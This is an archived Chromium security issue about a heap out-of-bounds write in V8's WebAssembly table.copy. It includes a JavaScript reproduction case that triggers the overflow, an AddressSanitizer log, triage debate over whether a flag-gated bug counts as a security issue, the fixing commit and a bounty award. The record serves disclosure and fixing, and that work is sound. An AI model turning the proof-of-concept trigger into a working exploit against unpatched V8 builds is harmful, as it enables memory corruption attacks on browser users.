# Security: WebAssembly Table.Copy lead to OOB Write

| Field | Value |
|-------|-------|
| **Issue ID** | [40095575](https://issues.chromium.org/issues/40095575) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ra...@gmail.com |
| **Assignee** | ah...@chromium.org |
| **Created** | 2019-07-02 |
| **Bounty** | $7,500.00 |

## Description

**VULNERABILITY DETAILS**

```
bool WasmInstanceObject::CopyTableEntries(Isolate\* isolate,  
                                          Handle<WasmInstanceObject> instance,  
                                          uint32_t table_src_index,  
                                          uint32_t table_dst_index,  
                                          uint32_t dst, uint32_t src,  
                                          uint32_t count) {  
..........  
  Handle<FixedArray> dispatch_tables(table->dispatch_tables(), isolate);  
  for (int i = 0; i < dispatch_tables->length();  
       i += kDispatchTableNumElements) {  
    Handle<WasmInstanceObject> target_instance(  
        WasmInstanceObject::cast(  
            dispatch_tables->get(i + kDispatchTableInstanceOffset)),  
        isolate);  
    CopyTableEntriesImpl(target_instance, dst, src, count, copy_backward);  
  }  

```

v8 engine use table 0 to be dispatch table. So dispatch table is fixed to table 0 size  

When copy to dispatch table, it must check whether or not its index is zero. if not, can be overflow  

**VERSION**  

V8 version 7.7.0

**REPRODUCTION CASE**  

load('test/mjsunit/wasm/wasm-module-builder.js');  

let instance;  

let instance2;  

let table1 = new WebAssembly.Table({initial:0x1, maximum:0x1, element: "anyfunc"});  

let table2 = new WebAssembly.Table({initial:0x100, maximum:0x100, element: "anyfunc"});

{  

let builder = new WasmModuleBuilder();

const void\_sig = builder.addType(kSig\_i\_i);

const func\_index = builder.addImport("q","func",void\_sig);  

let sig\_v\_iii = builder.addType(kSig\_v\_iii);

builder.addExport("hack", func\_index);

const table\_index1 = builder.addImportedTable("q", "table1", 0x1, 0x1);  

const table\_index2 = builder.addImportedTable("q", "table2", 0x100, 0x100);  

builder.addFunction("copy", sig\_v\_iii)  

.addBody([  

kExprGetLocal, 0,  

kExprGetLocal, 1,  

kExprGetLocal, 2,  

kNumericPrefix, kExprTableCopy, table\_index1, table\_index1])  

.exportAs("copy");

let wasm\_m = builder.toModule();

let func = (v)=>{  

return 1;  

}  

instance = new WebAssembly.Instance(wasm\_m, {q:{table1:table1, table2:table2, func:func}});  

}  

{  

let builder = new WasmModuleBuilder();

const void\_sig = builder.addType(kSig\_i\_i);

const func\_index = builder.addImport("q","func",void\_sig);  

let sig\_v\_iii = builder.addType(kSig\_v\_iii);

builder.addExport("hack", func\_index);

const table\_index1 = builder.addImportedTable("q", "table1", 0x100, 0x100);  

const table\_index2 = builder.addImportedTable("q", "table2", 0x1, 0x1);  

builder.addFunction("copy", sig\_v\_iii)  

.addBody([  

kExprGetLocal, 0,  

kExprGetLocal, 1,  

kExprGetLocal, 2,  

kNumericPrefix, kExprTableCopy, table\_index1, table\_index1])  

.exportAs("copy");

let wasm\_m = builder.toModule();  

let func = (v)=>{  

return 1;  

}  

instance2 = new WebAssembly.Instance(wasm\_m, {q:{table1:table2, table2:table1, func:func}});  

}  

instance2.exports.copy(0, 20, 40);

**CREDIT INFORMATION**  

Reporter credit: Woojin Oh (@pwn\_expoit)

## Attachments

- [exploit.js](attachments/exploit.js) (text/plain, 4.5 KB)

## Timeline

### ra...@gmail.com (2019-07-02)

Asan log
==121672==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000007920 at pc 0x557a174828c2 bp 0x7ffdad00acb0 sp 0x7ffdad00aca8
READ of size 4 at 0x602000007920 thread T0
    #0 0x557a174828c1 in v8::internal::IndirectFunctionTableEntry::sig_id() const src/wasm/wasm-objects.cc:1514:21
    #1 0x557a17482bc4 in v8::internal::IndirectFunctionTableEntry::CopyFrom(v8::internal::IndirectFunctionTableEntry const&) src/wasm/wasm-objects.cc:1523:12
    #2 0x557a1748aef4 in v8::internal::(anonymous namespace)::CopyTableEntriesImpl(v8::internal::Handle<v8::internal::WasmInstanceObject>, unsigned int, unsigned int, unsigned int, bool) src/wasm/wasm-objects.cc:1753:16
    #3 0x557a17489d44 in v8::internal::WasmInstanceObject::CopyTableEntries(v8::internal::Isolate*, v8::internal::Handle<v8::internal::WasmInstanceObject>, unsigned int, unsigned int, unsigned int, unsigned int, unsigned int) src/wasm/wasm-objects.cc:1798:5
    #4 0x557a170b31bc in __RT_impl_Runtime_WasmTableCopy src/runtime/runtime-wasm.cc:629:15
    #5 0x557a170b31bc in v8::internal::Runtime_WasmTableCopy(int, unsigned long*, v8::internal::Isolate*) src/runtime/runtime-wasm.cc:618
    #6 0x557a17f9fe58 in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit (/home/oujin/d8-asan-no-inline-linux-release-v8-component-62486/d8+0x37f1e58)
    #7 0x7ec2a2ba03da  (<unknown module>)
    #8 0x7eba2a102592  (<unknown module>)
    #9 0x557a17f217a3 in Builtins_InterpreterEntryTrampoline (/home/oujin/d8-asan-no-inline-linux-release-v8-component-62486/d8+0x37737a3)
    #10 0x557a17f1f09c in Builtins_JSEntryTrampoline (/home/oujin/d8-asan-no-inline-linux-release-v8-component-62486/d8+0x377109c)
    #11 0x557a17f1ee77 in Builtins_JSEntry (/home/oujin/d8-asan-no-inline-linux-release-v8-component-62486/d8+0x3770e77)
    #12 0x557a160802d2 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) src/execution/execution.cc:265:33
    #13 0x557a1607f166 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) src/execution/execution.cc:357:10
    #14 0x557a15b5a5bf in v8::Script::Run(v8::Local<v8::Context>) src/api/api.cc:2137:7
    #15 0x557a15aa56f0 in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::Value>, v8::Shell::PrintResult, v8::Shell::ReportExceptions, v8::Shell::ProcessMessageQueue) src/d8/d8.cc:563:28
    #16 0x557a15abb6a3 in v8::SourceGroup::Execute(v8::Isolate*) src/d8/d8.cc:2490:10
    #17 0x557a15ac1393 in v8::Shell::RunMain(v8::Isolate*, int, char**, bool) src/d8/d8.cc:2963:39
    #18 0x557a15ac464c in v8::Shell::Main(int, char**) src/d8/d8.cc:3532:16
    #19 0x7fbdcb64082f in __libc_start_main /build/glibc-LK5gWL/glibc-2.23/csu/../csu/libc-start.c:291

0x602000007920 is located 15 bytes to the right of 1-byte region [0x602000007910,0x602000007911)


### ra...@gmail.com (2019-07-02)

need --experimental-wasm-anyref flag


### li...@chromium.org (2019-07-02)

Tentatively setting labels based on this being a heap-buffer-overflow and punting to v8 sheriff for further triage and help reproducing.

[Monorail components: Blink>JavaScript>WebAssembly]

### ra...@gmail.com (2019-07-03)

exploit code in v8 7.7.0 --experimental-wasm-anyref

### ms...@chromium.org (2019-07-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-03)

I can reproduce locally, will upload to ClusterFuzz.

### cl...@chromium.org (2019-07-03)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6318919573176320.

### cl...@chromium.org (2019-07-03)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5922557912285184.

### cl...@chromium.org (2019-07-03)

As this requires the --experimental-wasm-anyref flag, this is not a security bug. Anyref (especially in combination with bulk memory) is still under development.

### ra...@gmail.com (2019-07-03)

why is not security bug? i reported https://crbug.com/chromium/964607 and get this bounty https://bugs.chromium.org/p/chromium/issues/detail?id=964607

### cl...@chromium.org (2019-07-03)

Testcase 6318919573176320 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6318919573176320.

### ra...@gmail.com (2019-07-03)

Although need anyref flag, i got bounty . Please feedback  :)

### cl...@chromium.org (2019-07-03)

Yes, that was a mistake on our side. Andreas will elaborate later.

### cl...@chromium.org (2019-07-03)

[Empty comment from Monorail migration]

### ju...@gmail.com (2019-07-03)

[Comment Deleted]

### ah...@chromium.org (2019-07-03)

Thank you for your report. I learned recently that issues that require changed flag values are not in Chrome's thread model, see https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#Why-arent-compromised_infected-machines-in-Chromes-threat-model. Since this issue needs the anyref flag to be changed, it is not considered a threat. Therefore it is not a security issue.

### ah...@chromium.org (2019-07-03)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-07-03)

Detailed report: https://clusterfuzz.com/testcase?key=5922557912285184

Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  IsInBounds(dst, count, instance->indirect_function_table_size()) in wasm-objects
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=60795:60796

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5922557912285184

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### ah...@chromium.org (2019-07-03)

[Empty comment from Monorail migration]

### ra...@gmail.com (2019-07-06)

i get to be curious during bug hunting again. You say that requiring changed flag values is not threat model. So, why is this bug( like https://crbug.com/chromium/934201, https://crbug.com/chromium/928720 and https://crbug.com/chromium/951795) security issue?


### ah...@chromium.org (2019-07-08)

Chrome's thread model is described in https://chromium.googlesource.com/chromium/src/+/master/docs/security/faq.md#Why-arent-compromised_infected-machines-in-Chromes-threat-model. If you find an issue within Chrome's thread model, then it's definitely a security issue. Otherwise it should not be marked as security issue. In my interpretation of the thread model, the bugs you link here are also no security issues. However, I'm not familiar with these issues, so there may be reasons why they indeed are security issues.

### ra...@gmail.com (2019-07-08)

it seem to be ambiguous and to need review again. Please clearly offer difference between other bug and my bug.

### ah...@chromium.org (2019-07-08)

awhalley@, could you reply to the question about when an issue is a security issue?

### aw...@google.com (2019-07-08)

Thanks ahass@. Yes, we should track this as a security issue. Whilst at the moment it does require the flag to be set and that does require local modification that’s outside our that model, I presume that ultimately we’d release the feature without the flag? In such cases we’re really interested to track security bug fixes to ensure that the feature is as safe as possible when launched.  

Though it’s worth checking: do you think we would have found and fixed this bug without this report? 

### ah...@chromium.org (2019-07-08)

re 24: The anyref feature is still at the first stage of development, we do not test it with ClusterFuzz yet. Looking at the repro I guess that Clusterfuzz would find this issue easily.

### sh...@chromium.org (2019-07-09)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-07-09)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ah...@chromium.org (2019-07-09)

[Empty comment from Monorail migration]

### aw...@google.com (2019-07-10)

Apologies, this should have been Security_Impact-None since it's behind a flag

### sh...@chromium.org (2019-07-11)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-07-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8.git/+/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8

commit 4786c5c8f14c6a549db1a9b4b6066df2b65deeb8
Author: Andreas Haas <ahaas@chromium.org>
Date: Fri Jul 12 07:29:18 2019

[wasm] Support table.copy for multiple tables

Even though this is not spec'ed yet, it's good to have an implementation
so that we can use clusterfuzz on it.

I changed the parameter order (hopefully) everywhere to
(table_dst_index, table_src_index, ...). This corresponds to the
(dst, src, ...) parameter order for the entry indices.

R=binji@chromium.org

Bug: v8:7581 chromium:980475
Change-Id: I2fb36ffd4bb2f2be5b22c8366732295fa6759236
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/1698386
Reviewed-by: Ben Smith <binji@chromium.org>
Commit-Queue: Andreas Haas <ahaas@chromium.org>
Cr-Commit-Position: refs/heads/master@{#62661}

[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/compiler/wasm-compiler.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/compiler/wasm-compiler.h
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/runtime/runtime-wasm.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/wasm/function-body-decoder-impl.h
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/wasm/graph-builder-interface.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/wasm/wasm-objects.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/src/wasm/wasm-objects.h
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/test/cctest/wasm/test-run-wasm-bulk-memory.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/test/cctest/wasm/wasm-run-utils.cc
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/test/common/wasm/wasm-macro-gen.h
[modify] https://crrev.com/4786c5c8f14c6a549db1a9b4b6066df2b65deeb8/test/unittests/wasm/function-body-decoder-unittest.cc


### cl...@chromium.org (2019-07-12)

Detailed report: https://clusterfuzz.com/testcase?key=5922557912285184

Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  IsInBounds(dst, count, instance->indirect_function_table_size()) in wasm-objects
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=60795:60796

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5922557912285184

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### ah...@chromium.org (2019-07-12)

bots ...

### cl...@chromium.org (2019-07-12)

ClusterFuzz testcase 5922557912285184 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=62660:62661

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### cl...@chromium.org (2019-07-12)

Detailed report: https://clusterfuzz.com/testcase?key=5922557912285184

Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: DCHECK failure
Crash Address: 
Crash State:
  IsInBounds(dst, count, instance->indirect_function_table_size()) in wasm-objects
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=60795:60796
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=62660:62661

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5922557912285184

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

### ah...@chromium.org (2019-07-12)

bots ...

### sh...@chromium.org (2019-07-12)

[Empty comment from Monorail migration]

### na...@google.com (2019-07-15)

[Empty comment from Monorail migration]

### in...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### in...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### aw...@google.com (2019-07-31)

[Empty comment from Monorail migration]

### na...@google.com (2019-08-01)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-08-01)

Congrats! The Panel decided to reward you $7,500 for this report! 

### na...@google.com (2019-08-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-18)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2019-10-18)

This issue was migrated from crbug.com/chromium/980475?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095575)*
